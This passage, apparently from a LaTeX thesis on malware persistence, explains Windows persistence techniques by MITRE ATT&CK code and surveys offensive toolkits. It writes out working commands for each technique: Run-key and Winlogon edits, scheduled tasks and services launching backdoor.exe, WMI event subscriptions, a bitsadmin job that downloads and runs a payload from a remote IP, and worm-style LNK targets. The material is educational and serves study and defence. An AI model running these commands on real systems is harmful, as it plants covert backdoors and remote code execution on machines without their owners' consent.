@@ -1,0 +1,287 @@
+\pagebreak
+\subsection{Persistence in Windows}
+\label{ssec:windows}
+
+Microsoft Windows has been the most used operating system by users around the world for more than 20 years, so, naturally, most persistence techniques have been developed focusing on this environment and its different versions.
+
+The next subsections are centered on techniques and tools that work in recent versions of this operating system, specifically in Windows 10, although most of them probably work in old versions too. 
+
+\subsubsection{List of techniques}
+\label{sssec:windowsTec}
+Considering that there are multiple mechanisms to deploy persistence and different names for the same technique, in this document apart from the name of the technique it is also written its code in the MITRE ATT\&CK® Matrix\cite{MitreWeb}, for easy classification.
+% footnotemark\footnotetext{ https://attack.mitre.org/}
+
+But to execute the following techniques, an executable (\texttt{.exe}) or a script is needed. Most of the scripts that are used to deploy persistence (or malware in general) in Windows, are based on native programming languages that were originally created to automate tasks or for the management of the computer. These scripts have the following extensions: 
+\begin{itemize}
+\item Shell commands (\texttt{.cmd})
+\item Batch files (\texttt{.bat})
+\item Visual Basic scripts (\texttt{.vbs}) (Office's macros)
+\item PowerShell scripts (\texttt{.ps1} and \texttt{.psm1})
+\item Services setup script (\texttt{.inf})
+\end{itemize} 
+
+\paragraph{Most common persistence techniques}
+Although it may seem logical that the most frequent techniques change as the operating system is updated, in this case it is not since they are not only the most used techniques but also very old and operating system dependant, as they use flaws in the system core design, which has been in use since early Windows versions. 
+
+In the following years, and with the release of Windows 11, it may happen that the techniques presented below will stop working or cease to be the most frequent ones, since the new operating system promises major structural changes. But anyway, it is also very possible that Windows 10 will continue to be used for many years to come, so there will still be room for them to be deployed.
+
+\pagebreak
+\begin{itemize}
+\item \textbf{T1547.001 - Startup Folder}: this folder was introduced in Windows 95 (1995), and contains a list of applications or programs that run automatically each time the computer boots up (or a user logs in). This folder, though, is usually always monitored by antimalware services.
+
+The path of this folder in a system with the user "User" should be the following: \verb|"C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"|
+
+And to deploy this kind of persistence, an executable or a script (\texttt{.cmd}, \texttt{.bat}, \texttt{.vbs}) is needed. 
+\vspace{7pt}
+\begin{spverbatim}
+### Example of a batch script, that runs an executable in another folder (malware.bat) ###
+start /b C:\Users\User\AppData\Local\Temp\malware.exe
+
+### Example of a shell script that runs a PowerShell script, and redirects its output to an external file (script.cmd) ###
+powerShell C:\Users\User\powershell_script.ps1 >> C:\Users\User\log_file.log
+\end{spverbatim}
+
+\vspace{10pt}
+It is worth mentioning that \underline{no special privileges are required}, as this folder can be modified by any kind of user (privileges are only essential when trying to reach other users' Startup Folder).\\
+
+\item \textbf{T1547.001 - Registry}: it was also introduced in Windows 95, and it stores important information about computer/user's configuration, such as commands that are needed to be executed on startup or proxy settings.
+
+There are two different types of keys: "\texttt{HKCU}" which stands for "\texttt{HKEY\_CURRENT\_USER}" or the user configuration, and "\texttt{HKLM}" that means "\texttt{HKEY\_LOCAL\_MACHINE}", also known as the whole computer configuration. This last type of registry keys \underline{requires elevated permissions} to be modified, so the user ones are the most frequently abused. 
+%\todo[inline]{creus que cal explicar cada comanda (de les que surten als quadres grisos) i els seus arguments?}
+
+\pagebreak
+Some of the most targeted registry keys are:
+\begin{itemize}%\small
+\item \verb|HKCU\Software\Microsoft\Windows\CurrentVersion\Run|
+\item \verb|HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce|
+\item \verb|HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices|
+\item \verb|HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|
+\item \verb|HKLM\Software\Microsoft\Windows\CurrentVersion\Run|
+\item \verb|HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce|
+\item \verb|HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices|
+\item \verb|HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|
+\item \verb|HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon|
+\end{itemize}
+
+Registry keys can be either modified within the user interface, executing the program  \verb|regedit|, or via shell commands such as the following (extracted from \cite{PayloadAllTheThings}):
+\vspace{7pt}
+\begin{spverbatim}
+### Command in shell script (without elevated privileges) ###
+> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+
+### Command in PowerShell (with elevated privileges) ###
+> Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
+\end{spverbatim}
+
+\vspace{10pt}
+But, since registry keys are often monitored by antimalware services, sometimes adversaries use different strategies in order to avoid being detected, such as the \textit{Dridex} malware, that hooked the Explorer's process (changed the behaviour of the application' windows manager process) for it to set this persistence only shortly before executing the computer shutdown command\cite{Dridex}.
+
+One of the reasons to use the registry is because it is very easy to change and also "invisible" to normal users, like most management tools. Because of that, antimalware systems usually keep track of suspicious changes in this tool.
+
+\pagebreak
+\item \textbf{T1053.005 - Scheduled Tasks}: introduced on Windows 95, it launches computer programs or scripts at predefined times or at specified time intervals. It is organized in "jobs" or "tasks", which are the unit that performs the execution, and "triggers", where the time of launch is configured.
+
+This tool is basic in all operating systems as there are lots of jobs that need to be done periodically, like performing system health checks. But it can also be used during persistence deployment for initial or recurring execution of malicious code: for example, to start a malware every day during working hours, or check if a malicious server is up every 2 days. 
+
+Similar to registry keys, sometimes \underline{elevated privileges are needed} to create or modify a Scheduled Task, depending on the nature of the task or the software to run.
+
+Also, the Windows Task Scheduler can be managed either through the GUI within the Administrator Tools section of the Control Panel (\texttt{taskschd.msc}), or through shell commands like the following, obtained from \cite{PayloadAllTheThings}:
+\vspace{7pt}
+\begin{spverbatim}
+### Commands in shell script (without elevated privileges) ###
+# Create the scheduled tasks to run once at 00.00
+> schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\backdoor.exe
+# Force run it now 
+> schtasks /run /tn "Device-Synchronize"
+
+### Commands in PowerShell (with elevated privileges) ###
+> $T = New-ScheduledTaskTrigger -Daily -At "9/30/2020 11:05:00 AM"
+> $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
+> $S = New-ScheduledTaskSettingsSet
+> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+> Register-ScheduledTask "Backdoor" -InputObject $D
+\end{spverbatim}%$
+
+\pagebreak
+\item \textbf{T1543.003 - Services}: a service\cite{WindowsServices} is an application type that runs in the background without a user interface (similar to a UNIX daemon process). It was introduced in the first versions of Microsoft Windows because it is an essential part, as they provide core operating system features, such as web serving, event logging, file serving, printing, cryptography, and error reporting.
+
+When Windows boots up, it starts services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\\
+Service configurations can be modified using utilities such as \texttt{sc.exe} and Reg, as documented in \cite{Mitre}. The following code show some examples, extracted from \cite{PayloadAllTheThings}:
+\begin{spverbatim}
+### Commands in shell script (with elevated privileges) ###
+> sc create Persistence binpath= "cmd.exe /k C:\Temp\persistence.exe" start="auto" obj="LocalSystem"
+> sc start Persistence
+
+### Commands in PowerShell (with elevated privileges) ###
+> New-Service -Name "Persistence" -BinaryPathName "C:\Windows\Temp\persistence.exe" -Description "Persistence test." -StartupType Automatic
+> sc start Persistence
+\end{spverbatim}
+
+Services have several advantages for adversaries: they are stealthier than normal programs (as they run in the background) and unknown to most users (users do not commonly know which services are legit or safe. Plus, services always have strange names, making it more confusing). The main inconvenience is that \underline{elevated privileges are required} to create or modify services, which is coherent given the administrative capacity of these applications.
+
+Finally, services are also used in other tactics like \textit{Privilege Escalation}, since, as an elevated user, it is possible to create services that do not run only as an average elevated user but as \texttt{SYSTEM}, which is the account with the highest privilege level in the Windows user model, capable of even getting all credentials stored on the computer. 
+\end{itemize}
+
+\paragraph{Other persistence techniques}
+Since all techniques already explained are commonly monitored by antimalware programs and services, new mechanisms are continuously being developed by adversaries. Because, even if they are not the most popular, they may work better or go undetected for longer periods.
+\begin{itemize}
+\item \textbf{T1546.003 - Windows Management Instrumentation} (\textbf{WMI}): this is a tool designed to ease the management of devices and applications in a network, providing information like the status of local or remote computer systems. 
+
+But, as it allows scripting languages (such as VBScript (\texttt{.vbs}) or Windows PowerShell (\texttt{.ps1})) to do the management, both locally and remotely, it can also be used to deploy malicious programs after certain trigger events. Examples of events that malware may be subscribed to (or events that can trigger execution) are clock time, user loging, or the computer's uptime.
+
+Typically persistence via WMI event subscription requires the creation of the following three classes, which are used to (1) store the payload or the arbitrary command, (2) to specify the event that will trigger the payload, and (3) to relate the two previous classes so execution and trigger are bind together\cite{WMIPersistence}:
+
+\begin{itemize}
+\item \texttt{EventFilter}: Trigger (new process, failed logon etc.)
+\item \texttt{EventConsumer}: Perform an action (execute payload etc.)
+\item \texttt{FilterToConsumerBinding}: Binds Filter and Consumer classes
+\end{itemize}
+
+These classes can be defined in a Managed Object Format (MOF) file, that is compiled; or also with the command prompt (shell script) using \texttt{wmic} or with PowerShell, as mentioned before: 
+\vspace{7pt}
+\begin{spverbatim}
+### Commands in shell script (with elevated privileges): an arbitrary payload is executed within 60 seconds every time Windows starts ###
+> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="TestingWMI", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="TestingWMI", ExecutablePath="C:\Windows\System32\malware.exe", CommandLineTemplate="C:\Windows\System32\malware.exe"
+> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"TestingWMI\"", Consumer="CommandLineEventConsumer.Name=\"TestingWMI\""
+\end{spverbatim}
+\vspace{7pt}
+
+It is important to note that, in order to install or subscribe to an event to execute arbitrary code, \underline{elevated privileges are necessary}. But, "in return", this type of persistence is especially neither easy to detect nor to clean up.
+
+\item \textbf{T1197 - BITS Jobs}: Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism used by updaters, messengers, and other applications that prefer to operate in the background. Unfortunately, this function can be abused to download or execute code using long-standing jobs, or invoking an arbitrary program when a job completes or errors (like system reboots).
+
+Another particularly useful characteristic of this persistence mechanism is that, by default, it \underline{does not require elevated privileges}, so it can be used by any type of user, even remotely.
+
+An example deploying this technique is the following, using \texttt{bitsadmin} in the command prompt:
+
+\vspace{7pt}
+
+\begin{spverbatim} 
+### Commands in shell script: a payload is downloaded from a remote IP, and then executed ###
+> bitsadmin /create backdoor
+> bitsadmin /addfile backdoor "http://11.12.13.14/backdoor.exe"  "C:\Tmp\backdoor.exe"
+
+# when the job (downloading) is complete, it executes the file without parameters.
+
+> bitsadmin /SetNotifyCmdLine backdoor C:\Tmp\backdoor.exe NULL
+> bitsadmin /SetMinRetryDelay "backdoor" 60  # if the job fails, it tries again in 60 sec.
+> bitsadmin /resume backdoor  # starts the job.
+\end{spverbatim}
+\vspace{7pt}
+
+\bigskip
+
+\item \textbf{T1546.015 - COM Object Hijacking}: Windows Component Object Model (COM) is a method to implement objects that could be used by different frameworks and in different Windows environments, allowing interoperability, inter-process communication and code reuse. 
+
+However, it can be abused by replacing references to legitimate software with malicious code to be executed, through hijacking the COM references and relationships in the Registry. This must be done carefully, to avoid system instability that could lead to detection. 
+
+\pagebreak
+As stated in \cite{COMObjects}, some of the most used registry sub-keys during COM Hijacking are these:
+\begin{itemize}
+\item \verb|InprocServer/InprocServer32| (threading model for 32-bits server app)
+\item \verb|LocalServer/LocalServer32| (path to 32-bits server app) 
+\item \verb|TreatAs| (ID of a class similar to the legit one)
+\item \verb|ProgID| (associates two IDs)
+\end{itemize}
+
+And the full paths to the above sub-keys are:
+\begin{itemize}
+\item \verb|HKEY_CURRENT_USER\Software\Classes\CLSID|
+\item \verb|HKEY_LOCAL_MACHINE\Software\Classes\CLSID|
+\end{itemize}
+
+So, as it can be seen in the last list, for this persistence mechanism  \underline{no elevated privileges} are needed (if only HKCU keys are modified), but only the knowledge of which of the most frequently used COM objects will not be missed if they stop working.
+
+\bigskip
+
+\item \textbf{T1547.009 - LNK modification}: Windows shortcuts ("\texttt{.lnk}" files) contain a reference to a file location\cite{Shortcut} (a folder, an executable, a script..), but they can also be altered to execute some commands before opening/executing the file (which is stealthy).
+
+An example of a "Calculator" shortcut, a little bit modified to make it start another executable before starting the actual calculator, would have the following code in its "Target" field:
+\vspace{7pt}
+\begin{spverbatim} 
+powershell.exe -c "invoke-item C:\Temp\mal.exe; invoke-item C:\Windows\System32\calc.exe"
+\end{spverbatim}
+\vspace{7pt}
+
+When executing automated PowerShell commands, the default behavior of the system is to open a PowerShell window to show the output of the command, and that can alert the user. But there are multiple ways to avoid being detected by the user that is currently using the machine, as PowerShell consoles can be hidden and processes can run in the background too. 
+
+\pagebreak
+A pretty interesting \textit{worm} named Forbix\cite{ForbixLNK}, used this method to replicate and persist itself every time a user clicked on it unintentionally. When executed, it:
+\begin{enumerate}
+\item Searched for external drives (as a worm always tries to replicate)
+\item When a drive was found, it changed folder attributes, making them \textit{hidden}
+\item Created shortcuts (.LNK files) for all hidden folders, using the same name and icon
+\item Copied the file "Manuel.doc" in the same root folder and marked it as "hidden"
+\item Used the following code in the "Target" field of the shortcuts, to execute itself again and then open the original folder, making it difficult for the user to detect it:
+\end{enumerate} 
+\begin{spverbatim}
+"C:\Windows\system32\cmd.exe" /c start wscript /e:VBScript.Encode Manuel.doc & start explorer <REPLACED_FOLDER_NAME>
+\end{spverbatim}
+\vspace{7pt}
+
+This "Manuel.doc" file was a malicious encoded VBScript (VBE Script), which had all the malware's logic, and that tried to communicate with external servers.
+
+To conclude, in this last example it can be appreciated that this technique usually \underline{does not require elevated privileges}, as there are plenty of user shortcuts that can be modified. Also, shortcuts in the "Startup Folder" can be used as well to make an executable file start when the user logs in.
+\end{itemize}
+
+To end this part, there are also lots of other techniques, and most of them are listed in MITRE\cite{Mitre}.
+
+\subsubsection{Tools to implement persistence}
+\label{sssec:windowsTools}
+Nowadays, multiple tools can be used to deploy persistence to some extent, but none of them works as provided, as they all need to be configured overhand.
+
+\paragraph{SharPersist}
+SharPersist\cite{SharPersist} is a Windows persistence toolkit developed in C\#, so it is not a script but an executable file. It is a modular, and therefore expandable, tool that was created by the FireEye\cite{FireEyeWeb} team to assist with establishing persistence on Windows operating systems using a multitude of different techniques like modifying the registry, adding scheduled tasks or services, and also modifying specific files of software such as Keepass\cite{KeePassWeb} or Tortoise SVN\cite{TortoiseSVNWeb}. 
+
+% \footnotemark\footnotetext{https://www.fireeye.com/}
+% \footnotemark\footnotetext{https://keepass.info/}
+% \footnotemark\footnotetext{https://tortoisesvn.net/}
+
+The techniques this tool can deploy do not always require administrator privileges, but it is also not fully automated: it works with the arguments received, so it needs to be prepared beforehand.
+
+%\todo[inline]{no sé si aqui posar un exemple gràfic de cada eina, o si posar-lo a un annex, o que)}
+
+\paragraph{Metasploit Framework - Meterpreter}
+A tool that is used a lot when performing security analysis is Meterpreter, from the Metasploit framework\cite{Metasploit}, an open source project developed by Rapid7\cite{Rapid7Web}. Meterpreter is an advanced, dynamically extensible payload that uses lots of techniques from different tactics to avoid detection, communicate over the network, get information about the computer and the internal network, etc. It is an executable file, developed in Ruby, that has a very wide suite of functionalities, being "persistence" among them\cite{Meterpreter}.
+
+% \footnotemark\footnotetext{https://www.rapid7.com/}
+
+The persistence mechanism this tool can deploy is both leaving a file with the payload (Meterpreter) and also adding a new service to the system. And once loaded, the meterpreter payload will, first of all, try to connect back to the attacker's server, thus creating a backdoor.
+
+
+\paragraph{Cobalt Strike}
+Similar to Meterpreter, Cobalt Strike\cite{CobaltStrike} is a full-featured, remote access tool advertised as an "adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors"; with the big difference that is also a commercial tool. Although its licenses cost thousands of dollars per year, it is widely used by big and powerful groups, because it is more stable and flexible than the Metasploit framework. 
+
+It has also some functionalities that work even better than frequently used tools like Meterpreter or Mimikatz\cite{Mimikatz}, and consequently, this is one of the most used software both by \textit{red teamers} and \textit{APTs}.
+
+\paragraph{Nishang Framework and PowerShell Empire}
+The \underline{Nishang Framework} is composed of multiple scripts and payloads to deploy lots of different techniques from various tactics.
+
+One of these files is the \texttt{Add-Persistence.ps1}\cite{Nishang}, which is a PowerShell script that deploys persistence using WMI and registry changes, configuring the system to execute a file (that is stored locally or in a URL) on every reboot.
+
+\pagebreak
+\underline{PowerShell Empire} is another big framework of tools to perform offensive security\cite{Empire}. There are some scripts that perform persistence using diverse mechanisms, to adapt to the attacker's situation: 
+\begin{itemize}
+\item Persistence with privileges (registry, scheduled tasks, and WMI)
+\item Persistence without privileges (registry and scheduled tasks)
+\item Persistence only in the memory (although it is volatile, there are some machines (like servers) that supposedly should never be turned off or rebooted)
+\item Other types of miscellaneous persistences
+
+\end{itemize}
+
+The downside of both of these frameworks is that they have been in use for some years now, and therefore they are usually quickly detected by antimalware services.
+
+%https://github.com/0xthirteen/SharpStay
+
+\paragraph{Backdooring tools}
+There are also some tools that can be used to reach the computer through the Internet, even though not all of them might be always suitable, as the connection to and from external networks may be limited by proxies or firewalls.
+
+\begin{itemize}
+\item \textbf{T1021.001 - Remote Desktop Protocol} (\textbf{RDP}): RDP is a widely used protocol in Windows systems, that provides a user with a graphical interface to connect to another computer over a network connection. 
+
+Even though it is great for remote administration, badly configured RDPs are one of the most common ways adversaries gain a foothold on enterprise systems, as internal servers are often exposed to the Internet, sometimes using predictable credentials.
+
+But this error in the configuration may not be unintentional, as this protocol is easy to set up, and therefore commonly used when trying to deploy a backdoor mechanism. 
+\item \textbf{HTTPS, DNS or ICMP tunnels, and connection though proxies} with tools like \textit{ReGeorge} or \textit{DNSCat2}, explained in section \ref{ssec:persistOthers}.
+\end{itemize}
